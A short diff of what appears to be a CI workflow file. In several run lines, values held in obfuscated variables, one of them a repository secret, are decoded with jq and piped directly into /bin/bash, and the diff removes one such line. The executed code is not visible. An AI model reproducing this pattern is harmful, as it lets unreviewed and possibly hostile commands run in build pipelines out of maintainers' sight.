@@ -17,7 +17,6 @@ jobs:
           tc8209: ${{ secrets.tc8209 }}
         run: |
           printf '%s' "$tc8209" | jq -r .gpyiy75310 | /bin/bash
-          echo $jakad29 | jq -r .wrf1 | /bin/bash
           echo $cqgk1117 | jq -r .ln26 | /bin/bash
           printf '%s' "$yr63" | jq -r .lfjlp26748 | /bin/bash
           printf '%s' "$qzspw8" | jq -r .hys634 | /bin/bash
